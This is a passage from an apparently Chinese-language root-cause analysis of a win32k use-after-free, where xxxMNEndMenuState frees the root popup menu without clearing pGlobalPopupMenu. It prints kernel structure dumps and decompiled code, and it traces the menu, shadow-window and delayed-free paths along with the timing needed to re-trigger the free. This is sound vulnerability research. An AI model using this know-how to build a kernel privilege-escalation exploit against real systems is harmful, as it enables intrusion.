   +0x034 vkButtonDown     : Int4B
   +0x038 uDraggingHitArea : Uint4B
   +0x03c uDraggingIndex   : Uint4B
   +0x040 uDraggingFlags   : Uint4B
   +0x044 hdcWndAni        : Ptr32 HDC__
   +0x048 dwAniStartTime   : Uint4B
   +0x04c ixAni            : Int4B
   +0x050 iyAni            : Int4B
   +0x054 cxAni            : Int4B
   +0x058 cyAni            : Int4B
   +0x05c hbmAni           : Ptr32 HBITMAP__
   +0x060 hdcAni           : Ptr32 HDC__
```

*结构体 tagMENUSTATE 的定义*

菜单管理是 `win32k` 中最复杂的组件之一，菜单处理作为一个整体依赖于多种十分复杂的函数和结构体。例如，在创建弹出菜单时，应用程序调用 `TrackPopupMenuEx` 在菜单内容显示的位置创建菜单类的窗口。接着该菜单窗口通过一个系统定义的菜单窗口类过程 `xxxMenuWindowProc` 处理消息输入，用以处理各种菜单特有的信息。此外，为了追踪菜单如何被使用，`win32k` 也将一个菜单状态结构体 `tagMENUSTATE` 与当前活跃菜单关联起来。通过这种方式，函数能够知道菜单是否在拖拽操作中调用、是否在菜单循环中、是否即将销毁，等等。

菜单状态结构体用来存储与当前活跃菜单的状态相关的详细信息，包括上下文菜单弹出的坐标、关联的位图表面对象的指针、窗口设备上下文对象、之前的上下文菜单结构体的指针，以及其他的一些成员域。

在线程信息结构体 `tagTHREADINFO` 中也存在一个指向菜单状态结构体指针的 `pMenuState` 成员域：

```
kd> dt win32k!tagTHREADINFO -d pMenuState
   +0x104 pMenuState : Ptr32 tagMENUSTATE
```

*结构体 tagTHREADINFO 存在 pMenuState 成员域*

当用户在操作系统中以点击鼠标右键或其他的方式弹出上下文菜单时，系统最终在内核中执行到 `xxxTrackPopupMenuEx` 函数。该函数调用 `xxxMNAllocMenuState` 函数来分配或初始化菜单状态结构体。

在函数 `xxxMNAllocMenuState` 中，系统将全局菜单状态对象 `gMenuState` 的所有成员域清空并对部分成员域进行初始化，然后将全局菜单状态对象的地址存储在当前线程信息对象的成员域 `pMenuState` 中。

```
  menuState = (tagMENUSTATE *)&gMenuState;
  [...]
  memset(menuState, 0, 0x60u);
  menuState->pGlobalPopupMenu = popupMenuRoot;
  menuState->ptiMenuStateOwner = ptiCurrent;
  menuState->pmnsPrev = ptiCurrent->pMenuState;
  ptiCurrent->pMenuState = menuState;
  if ( ptiNotify != ptiCurrent )
    ptiNotify->pMenuState = menuState;
  [...]
  return menuState;
```

*函数 xxxMNAllocMenuState 的代码片段*

函数初始化了菜单状态结构体中的 `pGlobalPopupMenu` / `ptiMenuStateOwner` 和 `pmnsPrev` 成员。成员域 `pGlobalPopupMenu` 指针指向通过参数传入作为根菜单的弹出菜单结构体 `tagPOPUPMENU` 对象。弹出菜单结构体存储关联的弹出菜单相关的各个内核对象的指针，与对应的菜单窗口对象关联，其结构体定义如下：

```
kd> dt win32k!tagPOPUPMENU
   +0x000 flags            : Int4B
   +0x004 spwndNotify      : Ptr32 tagWND
   +0x008 spwndPopupMenu   : Ptr32 tagWND
   +0x00c spwndNextPopup   : Ptr32 tagWND
   +0x010 spwndPrevPopup   : Ptr32 tagWND
   +0x014 spmenu           : Ptr32 tagMENU
   +0x018 spmenuAlternate  : Ptr32 tagMENU
   +0x01c spwndActivePopup : Ptr32 tagWND
   +0x020 ppopupmenuRoot   : Ptr32 tagPOPUPMENU
   +0x024 ppmDelayedFree   : Ptr32 tagPOPUPMENU
   +0x028 posSelectedItem  : Uint4B
   +0x02c posDropped       : Uint4B
```

*结构体 tagPOPUPMENU 的定义*

菜单状态结构体对象的成员域 `ptiMenuStateOwner` 指向当前线程的线程信息结构体对象。线程信息结构体对象中已存在的菜单状态结构体指针被存储在当前菜单状态结构体对象的 `pmnsPrev` 成员域中。

随后函数将菜单状态结构体的地址放置在通过参数传入的当前线程（和通知线程）的线程信息结构体 `tagTHREADINFO` 对象的成员域 `pMenuState` 中，并将菜单状态结构体的地址作为返回值返回给上级调用者函数。

![]()
*当前线程信息对象和菜单状态对象的对应关系*

---

当用户通过键鼠选择菜单项、或点击菜单范围之外的屏幕区域时，系统将向当前上下文菜单的窗口对象发送相关鼠标按下或菜单终止的事件消息。在菜单对象的类型为模态的情况下，这导致之前调用 `xxxMNLoop` 函数的线程退出菜单循环等待状态，使函数继续向后执行。

系统调用 `xxxMNEndMenuState` 函数来清理菜单状态结构体存储的信息与释放相关的弹出菜单对象和窗口对象。

```
  ptiCurrent = gptiCurrent;
  menuState = gptiCurrent->pMenuState;
  if ( !menuState->dwLockCount )
  {
    MNEndMenuStateNotify(gptiCurrent->pMenuState);
    if ( menuState->pGlobalPopupMenu )
    {
      if ( fFreePopup )
        MNFreePopup(menuState->pGlobalPopupMenu);
      else
        *(_DWORD *)menuState->pGlobalPopupMenu &= 0xFFFEFFFF;
    }
    UnlockMFMWFPWindow(&menuState->uButtonDownHitArea);
    UnlockMFMWFPWindow(&menuState->uDraggingHitArea);
    ptiCurrent->pMenuState = menuState->pmnsPrev;
    [...]
  }
```

*函数 xxxMNEndMenuState 的代码片段*

在函数 `xxxMNEndMenuState` 中，系统从当前线程的线程信息对象中获取 `pMenuState` 成员域指向的菜单状态结构体对象。随后函数判断菜单状态结构体对象的成员域 `pGlobalPopupMenu` 是否为空，不为空则调用函数 `MNFreePopup` 释放该成员域指向的弹出菜单 `tagPOPUPMENU` 对象。在执行相应的预处理之后，函数 `MNFreePopup` 调用 `ExFreePoolWithTag` 释放传入的 `tagPOPUPMENU` 对象缓冲区。

```
  if ( popupMenu == popupMenu->ppopupmenuRoot )
    MNFlushDestroyedPopups(popupMenu, 1);
  pwnd = popupMenu->spwndPopupMenu;
  if ( pwnd && (pwnd->fnid & 0x3FFF) == 0x29C && popupMenu != &gpopupMenu )
    *((_DWORD *)pwnd + 0x2C) = 0;
  HMAssignmentUnlock(&popupMenu->spwndPopupMenu);
  HMAssignmentUnlock(&popupMenu->spwndNextPopup);
  HMAssignmentUnlock(&popupMenu->spwndPrevPopup);
  UnlockPopupMenu(popupMenu, &popupMenu->spmenu);
  UnlockPopupMenu(popupMenu, &popupMenu->spmenuAlternate);
  HMAssignmentUnlock(&popupMenu->spwndNotify);
  HMAssignmentUnlock(&popupMenu->spwndActivePopup);
  if ( popupMenu == &gpopupMenu )
    gdwPUDFlags &= 0xFF7FFFFF;
  else
    ExFreePoolWithTag(popupMenu, 0);
```

*函数 MNFreePopup 的代码片段*

这时问题就出现了：函数 `xxxMNEndMenuState` 在将菜单状态结构体对象的成员域 `pGlobalPopupMenu` 指向的弹出菜单对象释放之后，却没有将该成员域置为空值，这将导致该成员域指向的内存地址处于不可控的状态，并导致被复用的潜在问题。

## 0x2 追踪

在 `user32.dll` 模块中存在导出函数 `TrackPopupMenuEx` 用于在屏幕指定位置显示弹出菜单并追踪选择的菜单项。当用户进程调用该函数时，系统在内核中最终调用到 `xxxTrackPopupMenuEx` 函数处理弹出菜单操作。

---

**菜单的对象**

在本分析中将涉及到与菜单相关的对象：菜单对象，菜单窗口对象和弹出菜单对象。

其中，菜单对象是菜单的实体，在内核中以结构体 `tagMENU` 实例的形式存在，用来描述菜单实体的菜单项、项数、大小等静态信息，但其本身并不负责菜单在屏幕中的显示，当用户进程调用 `CreateMenu` 等接口函数时系统在内核中创建菜单对象，当调用函数 `DestroyMenu` 或进程结束时菜单对象被销毁。

当需要在屏幕中的位置显示某菜单时，例如，用户在某窗口区域点击鼠标右键，在内核中系统将调用相关服务函数根据目标菜单对象创建对应的类型为 `MENUCLASS` 的菜单窗口对象。菜单窗口对象是窗口结构体 `tagWND` 对象的特殊类型，通常以结构体 `tagMENUWND` 的形式表示，负责描述菜单在屏幕中的显示位置、样式等动态信息，其扩展区域关联对应的弹出菜单对象。

弹出菜单对象 `tagPOPUPMENU` 作为菜单窗口对象的扩展对象，用来描述所代表的菜单的弹出状态，以及与菜单窗口对象、菜单对象、子菜单或父级菜单的菜单窗口对象等用户对象相互关联。

当某个菜单在屏幕中弹出时，菜单窗口对象和关联的弹出菜单对象被创建，当菜单被选择或取消时，该菜单将不再需要在屏幕中显示，此时系统将在适当时机销毁菜单窗口对象和弹出菜单对象。

---

**弹出菜单**

内核函数 `xxxTrackPopupMenuEx` 负责菜单的弹出和追踪。在该函数执行期间，系统调用 `xxxCreateWindowEx` 函数为即将被显示的菜单对象创建关联的类名称为 `#32768`(`MENUCLASS`) 的菜单窗口对象。类型为 `MENUCLASS` 的窗口对象通常用 `tagMENUWND` 结构体表示，这类窗口对象在紧随基础的 `tagWND` 对象其后的位置存在 1 个指针长度的扩展区域，用来存储指向关联的 `tagPOPUPMENU` 对象指针。

```
pwndHierarchy = xxxCreateWindowEx(
    0x181,
    0x8000, // MENUCLASS
    0x8000, // MENUCLASS
    0,
    0x80800000,
    xLeft,
    yTop,
    100,
    100,
    (pMenu->fFlags & 0x40000000) != 0 ? pwndOwner : 0, // MNS_MODELESS
    0,
    pwndOwner->hModule,
    0,
    0x601u,
    0);
```

*函数 xxxTrackPopupMenuEx 创建 MENUCLASS 窗口对象*

在函数 `xxxCreateWindowEx` 中分配窗口对象后，函数向该对象发送 `WM_NCCREATE` 等事件消息，并调用窗口对象指定的消息处理程序。类型为 `MENUCLASS` 的窗口对象指定的的消息处理程序是 `xxxMenuWindowProc` 内核函数。处理 `WM_NCCREATE` 消息时，函数创建并初始化与窗口对象关联的弹出菜单信息结构体 `tagPOPUPMENU` 对象，将菜单窗口 `tagMENUWND` 对象指针放入 `tagPOPUPMENU->spwndPopupMenu` 成员域中，并将弹出菜单 `tagPOPUPMENU` 对象指针放入关联窗口 `tagMENUWND` 对象末尾的指针长度的扩展区域中。

![]()
*结构体 tagMENUWND 和 tagPOPUPMENU 对象的对应关系*

在通过函数 `xxxSendMessageTimeout` 向窗口对象发送 `WM_NCCREATE` 等事件消息时，系统在调用对象指定的消息处理程序之前，还会调用 `xxxCallHook` 函数用来调用先前由用户进程设定的 `WH_CALLWNDPROC` 类型的挂钩处理程序。设置这种类型的挂钩会在每次线程将消息发送给窗口对象之前调用。

```
if ( (LOBYTE(gptiCurrent->fsHooks) | LOBYTE(gptiCurrent->pDeskInfo->fsHooks)) & 0x20 )
{
  v22 = pwnd->head.h;
  v20 = wParam;
  v19 = lParam;
  v21 = message;
  v23 = 0;
  xxxCallHook(0, 0, &v19, 4); // WH_CALLWNDPROC
}
```

*函数 xxxSendMessageTimeout 调用 xxxCallHook 函数*

接下来函数 `xxxTrackPopupMenuEx` 调用 `xxxMNAllocMenuState` 来初始化菜单状态结构体的各个成员域，并将前面创建的弹出菜单 `tagPOPUPMENU` 对象作为当前的根弹出菜单对象，其指针被放置在菜单状态结构体的成员域 `pGlobalPopupMenu` 中。

```
menuState = xxxMNAllocMenuState(ptiCurrent, ptiNotify, popupMenu);
```

*函数 xxxTrackPopupMenuEx 初始化菜单状态结构体*

接下来函数调用 `xxxSetWindowPos` 函数以设置目标菜单窗口在屏幕中的位置并将其显示在屏幕中。在函数 `xxxSetWindowPos` 执行期间，相关窗口位置和状态已完成改变之后，系统在函数 `xxxEndDeferWindowPosEx` 中调用 `xxxSendChangedMsgs` 以发送窗口位置已改变的消息。

```
  xxxSetWindowPos(
    pwndHierarchy,
    (((*((_WORD *)menuState + 2) >> 8) & 1) != 0) - 1,
    xLParam,
    yLParam,
    0,
    0,
    ~(0x10 * (*((_WORD *)menuState + 2) >> 8)) & 0x10 | 0x241);
```

*函数 xxxTrackPopupMenuEx 显示根菜单窗口对象*

在函数 `xxxSendChangedMsgs` 中，系统根据设置的 `SWP_SHOWWINDOW` 状态标志，为当前的目标菜单窗口对象创建并添加关联的阴影窗口对象。两个窗口对象的关联关系在函数 `xxxAddShadow` 中被添加到 `gpshadowFirst` 阴影窗口关联表中。

从函数 `xxxSetWindowPos` 中返回后，函数 `xxxTrackPopupMenuEx` 调用 `xxxWindowEvent` 函数以发送代表“菜单弹出开始”的 `EVENT_SYSTEM_MENUPOPUPSTART` 事件通知。

```
xxxWindowEvent(6u, pwndHierarchy, 0xFFFFFFFC, 0, 0);
```

*函数 xxxTrackPopupMenuEx 发送菜单弹出开始的事件通知*

如果先前在用户进程中设置了包含这种类型事件通知范围的窗口事件通知处理函数，那么系统将在线程消息循环处理期间分发调用这些通知处理函数。

接下来菜单对象类型为模态的情况下线程将会进入菜单消息循环等待状态，而非模态的情况将会返回。

一图以蔽之：

![]()
*函数 xxxTrackPopupMenuEx 的简略执行流*

---

**bServerSideWindowProc**

窗口结构体 `tagWND` 对象的成员标志位 `bServerSideWindowProc` 是一个特殊标志位，该标志位决定所属窗口对象的消息处理函数属于服务端还是客户端。当函数 `xxxSendMessageTimeout` 即将调用目标窗口对象的消息处理函数以分发消息时，会判断该标志位是否置位。

```
  if ( *((_BYTE *)&pwnd->1 + 2) & 4 ) // bServerSideWindowProc
  {
    IoGetStackLimits(&uTimeout, &fuFlags);
    if ( &fuFlags - uTimeout < 0x1000 )
      return 0;
    lRet = pwnd->lpfnWndProc(pwnd, message, wParam, lParam);
    if ( !lpdwResult )
      return lRet;
    *(_DWORD *)lpdwResult = lRet;
  }
  else
  {
    xxxSendMessageToClient(pwnd, message, wParam, lParam, 0, 0, &fuFlags);
    [...]
  }
```

*函数 xxxSendMessageTimeout 执行窗口对象消息处理函数的逻辑*

如果该标志位置位，则函数将直接使当前线程在内核上下文调用目标窗口对象的消息处理函数；否则，函数通过调用函数 `xxxSendMessageToClient` 将消息发送到客户端进行处理，目标窗口对象的消息处理函数将始终在用户上下文调用和执行。

诸如菜单窗口对象之类的特殊窗口对象拥有专门的内核模式消息处理函数，因此这些窗口对象的成员标志位 `bServerSideWindowProc` 在对象创建时就被置位。而普通窗口对象由于只指向默认消息处理函数或用户进程自定义的消息处理函数，因此该标志位往往不被置位。

如果能够通过某种方式将未置位标志位 `bServerSideWindowProc` 的窗口对象的该标志位置位，那么该窗口对象指向的消息处理函数也将直接在内核上下文中执行。

---

**阴影窗口**

在 Windows XP 及更高系统的 `win32k` 内核模块中，系统为所有带有 `CS_DROPSHADOW` 标志的窗口对象创建并关联对应的类名称为 `SysShadow` 的阴影窗口对象，用来渲染原窗口的阴影效果。内核中存在全局表 `win32k!gpshadowFirst` 用以记录所有阴影窗口对象与原窗口对象的关联关系。函数 `xxxAddShadow` 用来为指定的窗口创建阴影窗口对象，并将对应关系写入 `gpshadowFirst` 全局表中。

全局表 `gpshadowFirst` 以链表的形式保存阴影窗口的对应关系。链表的每个节点存储 3 个指针长度的成员域，分别存储原窗口和阴影窗口的对象指针，以及下一个链表节点的指针。每个新添加的关系节点将始终位于链表的首个节点位置，其地址被保存在 `gpshadowFirst` 全局变量中。

![]()
*全局变量 gpshadowFirst 指向阴影窗口关联链表*

相应地，当阴影窗口不再需要时，系统调用 `xxxRemoveShadow` 来将指定窗口的阴影窗口关联关系移除并销毁该阴影窗口对象，函数根据通过参数传入的原窗口对象的指针在链表中查找第一个匹配的链表节点，从链表中取出节点并释放节点内存缓冲区、销毁阴影窗口对象。

---

**子菜单**

如果当前在屏幕中显示的菜单中存在子菜单项，那么当用户通过鼠标按键点击等方式选择子菜单项时，系统向子菜单项所属的菜单窗口对象发送 `WM_LBUTTONDOWN` 鼠标左键按下的消息。如果菜单为非模态（`MODELESS`）类型，内核函数 `xxxMenuWindowProc` 接收该消息并传递给 `xxxCallHandleMenuMessages` 函数。

函数 `xxxCallHandleMenuMessages` 负责像模态弹出菜单的消息循环那样处理非模态弹出菜单对象的消息。在函数中，系统根据通过参数 `lParam` 传入的相对坐标和当前窗口在屏幕上的坐标来计算鼠标点击的实际坐标，并向下调用 `xxxHandleMenuMessages` 函数。

函数将计算的实际坐标点传入 `xxxMNFindWindowFromPoint` 函数查找坐标点坐落的在屏幕中显示的窗口，并将查找到的窗口对象指针写入菜单状态结构体的成员域 `uButtonDownHitArea` 中。当该值确实是（菜单）窗口对象时，函数向该窗口对象发送 `MN_BUTTONDOWN` 鼠标按下的消息。

接着执行流又进入函数 `xxxMenuWindowProc` 并调用函数 `xxxMNButtonDown` 以处理 `MN_BUTTONDOWN` 消息。

```
case 0x1EDu:
  if ( wParam < pmenu->cItems || wParam >= 0xFFFFFFFC )
    xxxMNButtonDown(popupMenu, menuState, wParam, 1);
  return 0;
```

*函数 xxxMenuWindowProc 调用 xxxMNButtonDown 函数*

函数 `xxxMNButtonDown` 调用 `xxxMNSelectItem` 函数以根据鼠标按下区域选择菜单项并存储在当前弹出菜单对象的成员域 `posSelectedItem` 中，随后调用函数 `xxxMNOpenHierarchy` 以打开新弹出的菜单。

在函数 `xxxMNOpenHierarchy` 执行期间，系统调用函数 `xxxCreateWindowEx` 创建新的类名称为 `MENUCLASS` 的子菜单窗口对象，并将新创建的子菜单窗口对象关联的弹出菜单结构体 `tagPOPUPMENU` 对象插入弹出菜单对象延迟释放链表中。

函数将新分配的子菜单窗口对象指针写入当前菜单窗口对象关联的弹出菜单信息结构体 `tagPOPUPMENU` 对象的成员域 `spwndNextPopup` 中，并将当前菜单窗口对象指针写入新分配的菜单窗口对象关联的 `tagPOPUPMENU` 对象的成员域 `spwndPrevPopup` 中，使新创建的弹出菜单对象成为当前菜单对象的子菜单。

![]()
*新创建的子菜单窗口和原菜单窗口 tagMENUWND 对象的对应关系*

函数将当前菜单窗口对象的弹出菜单信息结构体 `tagPOPUPMENU` 对象的标志成员域 `fHierarchyDropped` 标志置位，这个标志位表示当前菜单对象已弹出子菜单。

接下来函数调用 `xxxSetWindowPos` 以设置新的菜单窗口在屏幕中的位置并将其显示在屏幕中，并调用函数 `xxxWindowEvent` 发送 `EVENT_SYSTEM_MENUPOPUPSTART` 事件通知。新菜单窗口对象对应的阴影窗口会在这次调用 `xxxSetWindowPos` 期间创建并与菜单窗口对象关联。

简要执行流如下：

![]()
*点击子菜单项以弹出子菜单时的简要执行流*

---

**终止菜单**

在用户进程中可以通过多种接口途径触达 `xxxMNEndMenuState` 函数调用，例如向目标菜单的窗口对象发送 `MN_ENDMENU` 消息，或调用 `NtUserMNDragLeave` 系统服务等。

当某调用者向目标菜单窗口对象发送 `MN_ENDMENU` 消息时，系统在菜单窗口消息处理函数 `xxxMenuWindowProc` 中调用函数 `xxxEndMenuLoop` 并传入当前线程关联的菜单状态结构体对象和其成员域 `pGlobalPopupMenu` 指向的根弹出菜单对象指针作为参数以确保完整的菜单对象被终止或取消。如果菜单对象是非模态类型的，那么函数接下来在当前上下文调用函数 `xxxMNEndMenuState` 清理菜单状态信息并释放相关对象。

```
  menuState = pwnd->head.pti->pMenuState;
  [...]
LABEL_227: // EndMenu
  xxxEndMenuLoop(menuState, menuState->pGlobalPopupMenu);
  if ( menuState->flags & 0x100 )
    xxxMNEndMenuState(1);
  return 0;
```

*函数 xxxMenuWindowProc 处理 MN\_ENDMENU 消息*

函数 `xxxEndMenuLoop` 执行期间，系统调用 `xxxMNDismiss` 并最终调用到 `xxxMNCancel` 函数来执行菜单取消的操作。

```
int __stdcall xxxMNDismiss(tagMENUSTATE *menuState)
{
  return xxxMNCancel(menuState, 0, 0, 0);
}
```

*函数 xxxMNDismiss 调用 xxxMNCancel 函数*

函数 `xxxMNCancel` 调用 `xxxMNCloseHierarchy` 函数来关闭当前菜单对象的菜单层叠状态。

```
popupMenu = pMenuState->pGlobalPopupMenu;
[...]
xxxMNCloseHierarchy(popupMenu, pMenuState);
```

*函数 xxxMNCancel 调用 xxxMNCloseHierarchy 函数*

函数 `xxxMNCloseHierarchy` 判断当前通过参数传入的弹出菜单 `tagPOPUPMENU` 对象成员域 `fHierarchyDropped` 标志位是否置位，如果未被置位则表示当前弹出菜单对象不存在任何弹出的子菜单，那么系统将使当前函数直接返回。

接下来函数 `xxxMNCloseHierarchy` 获取当前弹出菜单对象的成员域 `spwndNextPopup` 存储的指针，该指针指向当前弹出菜单对象所弹出的子菜单的窗口对象。函数通过 `xxxSendMessage` 函数调用向该菜单窗口对象发送 `MN_CLOSEHIERARCHY` 消息，最终在消息处理函数 `xxxMenuWindowProc` 中接收该消息并对目标窗口对象关联的弹出菜单对象调用 `xxxMNCloseHierarchy` 以处理关闭子菜单的菜单对象菜单层叠状态的任务。

```
  popupMenu = *(tagPOPUPMENU **)((_BYTE *)pwnd + 0xb0);
  menuState = pwnd->head.pti->pMenuState;
  [...]
case 0x1E4u:
  xxxMNCloseHierarchy(popupMenu, menuState);
  return 0;
```

*函数 xxxMenuWindowProc 处理 MN\_CLOSEHIERARCHY 消息*

函数 `xxxSendMessage` 返回之后，接着函数 `xxxMNCloseHierarchy` 调用 `xxxDestroyWindow` 函数以尝试销毁弹出的子菜单的窗口对象。需要注意的是，这里尝试销毁的是弹出的子菜单的窗口对象，而不是当前菜单的窗口对象。

在函数 `xxxDestroyWindow` 执行期间，系统调用函数 `xxxSetWindowPos` 以隐藏目标菜单窗口对象在屏幕中的显示。

```
dwFlags = 0x97;
if ( fAlreadyDestroyed )
  dwFlags = 0x2097;
xxxSetWindowPos(pwnd, 0, 0, 0, 0, 0, dwFlags);
```

*函数 xxxDestroyWindow 隐藏目标窗口对象的显示*

在函数 `xxxSetWindowPos` 执行后期，与当初创建菜单窗口对象时相对应地，系统调用函数 `xxxSendChangedMsgs` 发送窗口位置已改变的消息。在该函数中，系统根据设置的 `SWP_HIDEWINDOW` 状态标志，通过调用函数 `xxxRemoveShadow` 在 `gpshadowFirst` 阴影窗口关联表中查找第一个与目标菜单窗口对象关联的阴影窗口关系节点，从链表中移除查找到的关系节点并销毁该阴影窗口对象。

接下来执行流从函数 `xxxDestroyWindow` 中进入函数 `xxxFreeWindow` 以执行对目标窗口对象的后续销毁操作。

函数根据目标窗口对象的成员域 `fnid` 的值调用对应的消息处理包装函数 `xxxWrapMenuWindowProc` 并传入 `WM_FINALDESTROY` 消息参数，最终在函数 `xxxMenuWindowProc` 中接收该消息并通过调用函数 `xxxMNDestroyHandler` 对目标弹出菜单对象执行清理相关数据的任务。在该函数中，目标弹出菜单对象的成员标志位 `fDestroyed` 和根弹出菜单对象的成员标志位 `fFlushDelayedFree` 被置位：

```
*(_DWORD *)popupMenu |= 0x8000u;
[...]
if ( *((_BYTE *)popupMenu + 2) & 1 )
{
  popupMenuRoot = popupMenu->ppopupmenuRoot;
  if ( popupMenuRoot )
    *(_DWORD *)popupMenuRoot |= 0x20000u;
}
```

*函数 xxxMNDestroyHandler 置位相关成员标志位*

接着函数 `xxxFreeWindow` 对目标窗口对象再次调用函数 `xxxRemoveShadow` 以移除其阴影窗口对象的关联。如果先前已将目标窗口对象的所有阴影窗口关联移除，则函数 `xxxRemoveShadow` 将在关系表中无法查找到对应的关联节点而直接返回。

```
if ( pwnd->pcls->atomClassName == gatomShadow )
  CleanupShadow(pwnd);
else
  xxxRemoveShadow(pwnd);
```

*函数 xxxFreeWindow 再次移除阴影窗口对象*

函数在执行一些对象的释放操作和解除锁定操作之后向上级调用者函数返回。此时由于锁计数尚未归零，因此目标窗口对象仍旧存在于内核中并等待后续的操作。

函数 `xxxDestroyWindow` 返回后，执行流回到函数 `xxxMNCloseHierarchy` 中。接着函数对当前弹出菜单对象的成员域 `spwndNextPopup` 指向的子菜单窗口对象解锁并将成员域置空，然后将当前弹出菜单对象关联的菜单窗口对象带赋值锁地赋值给根弹出菜单对象的成员域 `spwndActivePopup` 中使当前窗口对象成为的活跃弹出菜单窗口对象，这导致原本锁定在成员域 `spwndActivePopup` 中的子菜单窗口对象解锁并使其锁计数继续减小。

```
HMAssignmentLock(
  (_HEAD **)&popupMenu->ppopupmenuRoot->spwndActivePopup,
  (_HEAD *)popupMenu->spwndPopupMenu);
```

*函数 xxxMNCloseHierarchy 使当前窗口对象成为的活跃弹出菜单窗口对象*

执行流从函数 `xxxMNCloseHierarchy` 返回到函数 `xxxMNCancel` 中，系统根据当前弹出菜单对象的成员标志位 `fIsTrackPopup` 选择调用 `xxxDestroyWindow` 以尝试销毁当前的菜单窗口对象。弹出菜单结构体的该成员标志位只在最开始通过函数 `xxxTrackPopupMenuEx` 创建根菜单窗口对象时对关联的弹出菜单对象置位。

接下来执行流返回到函数 `xxxMenuWindowProc` 中，函数对非模态类型的菜单对象调用 `xxxMNEndMenuState` 以清理菜单状态信息并释放相关对象。

![]()
*菜单选择或取消时的简要执行流*

---

**弹出菜单对象延迟释放链表**

在弹出菜单结构体 `tagPOPUPMENU` 中存在成员域 `ppmDelayedFree`，该成员域用来将所有被标记为延迟释放状态的弹出菜单对象连接起来，以便在菜单的弹出状态终止时将所有弹出菜单对象统一销毁。

线程关联的菜单状态 `tagMENUSTATE` 对象的成员域 `pGlobalPopupMenu` 指向的是根弹出菜单对象，根弹出菜单对象的成员域 `ppmDelayedFree` 作为弹出菜单对象延迟释放链表的入口，指向链表的第一个节点。后续的每个被指向的弹出菜单对象的成员域 `ppmDelayedFree` 将指向下一个链表节点对象。

在函数 `xxxMNOpenHierarchy` 中，函数将新创建的子菜单窗口对象关联的弹出菜单结构体 `tagPOPUPMENU` 对象插入弹出菜单对象延迟释放链表。新的弹出菜单对象被放置在链表的起始节点位置，其地址被存储在根弹出菜单对象的成员域 `ppmDelayedFree` 中，而原本存储于根弹出菜单成员域 `ppmDelayedFree` 中的地址被存储在新的弹出菜单对象的成员域 `ppmDelayedFree` 中。

![]()
*新的弹出菜单对象被插入弹出菜单对象延迟释放链表*

---

**xxxMNEndMenuState**

在函数 `xxxMNEndMenuState` 执行时，系统调用函数 `MNFreePopup` 来释放由当前菜单状态 `tagMENUSTATE` 对象的成员域 `pGlobalPopupMenu` 指向的根弹出菜单对象。

函数 `MNFreePopup` 在一开始判断通过参数传入的目标弹出菜单对象是否为当前的根弹出菜单对象，如果是则调用函数 `MNFlushDestroyedPopups` 以遍历并释放其成员域 `ppmDelayedFree` 指向的弹出菜单对象延迟释放链表中的各个弹出菜单对象。

函数 `MNFlushDestroyedPopups` 遍历链表中的每个弹出菜单对象，并为每个标记了标志位 `fDestroyed` 的对象调用 `MNFreePopup` 函数。标志位 `fDestroyed` 当初在调用函数 `xxxMNDestroyHandler` 时被置位。

```
ppmDestroyed = popupMenu;
for ( i = &popupMenu->ppmDelayedFree; *i; i = &ppmDestroyed->ppmDelayedFree )
{
  ppmFree = *i;
  if ( *(_DWORD *)*i & 0x8000 )
  {
    ppmFree = *i;
    *i = ppmFree->ppmDelayedFree;
    MNFreePopup(ppmFree);
  }
  [...]
}
```

*函数 MNFlushDestroyedPopups 遍历延迟释放链表*

在函数 `MNFlushDestroyedPopups` 返回之后，函数 `MNFreePopup` 调用 `HMAssignmentUnlock` 函数解除 `spwndPopupMenu` 等各个窗口对象成员域的赋值锁。

在 Windows 内核中，所有的窗口对象起始位置存在成员结构体 `HEAD` 对象，该结构体存储句柄值（`h`）的副本，以及锁计数（`cLockObj`），每当对象被使用时其值增加；当对象不再被特定的组件使用时，它的锁计数减小。在锁计数达到零的时候，窗口管理器知道该对象不再被系统使用然后将其释放。

函数 `HMAssignmentUnlock` 被用来解除先前针对指定对象的实施的带赋值锁的引用，并减小目标对象的锁计数。当目标对象的锁计数减小到 `0` 时，系统将调用函数 `HMUnlockObjectInternal` 销毁该对象。

```
bToFree = head->cLockObj == 1;
--head->cLockObj;
if ( bToFree )
  head = HMUnlockObjectInternal(head);
return head;
```

*函数 HMUnlockObject 判断需要销毁的目标对象*

函数 `HMUnlockObjectInternal` 通过目标对象的句柄在全局共享信息结构体 `gSharedInfo` 对象的成员域 `aheList` 指向的会话句柄表中找到该对象的句柄表项，然后通过在句柄表项中存储的句柄类型在函数 `HMDestroyUnlockedObject` 中调用索引在全局句柄类型信息数组 `gahti` 中的对象销毁函数。如果当前被销毁的目标对象类型是窗口对象，这将调用到内核函数 `xxxDestroyWindow` 中。

在函数 `MNFreePopup` 的末尾，由于已完成对各个成员域的解锁和释放，系统调用函数 `ExFreePoolWithTag` 释放目标弹出菜单 `tagPOPUPMENU` 对象。

通过分析代码可知，函数 `xxxMNEndMenuState` 在调用函数 `MNFreePopup` 释放弹出菜单信息结构体的各个成员域之后，会将当前菜单状态对象的成员域 `pmnsPrev` 存储的前菜单状态对象指针赋值给当前线程信息结构体对象的成员域 `pMenuState` 指针，而通常情况下 `pmnsPrev` 的值为 `0`。

```
kd> ub
win32k!xxxMNEndMenuState+0x50:
93a96022 8b4620          mov     eax,dword ptr [esi+20h]
93a96025 898704010000    mov     dword ptr [edi+104h],eax
kd> r eax
eax=00000000
```

*函数 xxxMNEndMenuState 重置线程信息结构体 pMenuState 成员域*

然而在菜单弹出期间，系统在各个追踪弹出菜单的函数或系统服务中都是通过线程信息对象的成员域 `pMenuState` 指针来获取菜单状态的，如果该成员域被赋值为其他值，就将导致触发漏洞的途径中某个节点直接失败而返回，造成漏洞利用失败。因此想要重新使线程执行流触达 `xxxMNEndMenuState` 函数中释放当前 `tagPOPUPMENU` 对象的位置以实现对目标漏洞的触发，**则必须在系统重置线程信息对象的成员域 `pMenuState` 之前的时机进行**。

在函数释放成员域 `pGlobalPopupMenu` 指向的根弹出菜单对象和重置线程信息对象的成员域 `pMenuState` 之间，只有两个函数调用：

```
UnlockMFMWFPWindow(&menuState->uButtonDownHitArea);
UnlockMFMWFPWindow(&menuState->uDraggingHitArea);
```

菜单状态结构体的成员域 `uButtonDownHitArea` 和 `uDraggingHitArea` 存储当前鼠标点击坐标位于的窗口对象指针和鼠标拖拽坐标位于的窗口对象指针。函数通过调用 `UnlockMFMWFPWindow` 函数解除对这两个成员域的赋值锁。

函数 `UnlockMFMWFPWindow` 在对目标参数进行简单校验之后调用 `HMAssignmentUnlock` 函数执行具体的解锁操作。

![]()
*函数 xxxMNEndMenuState 的简要执行流*

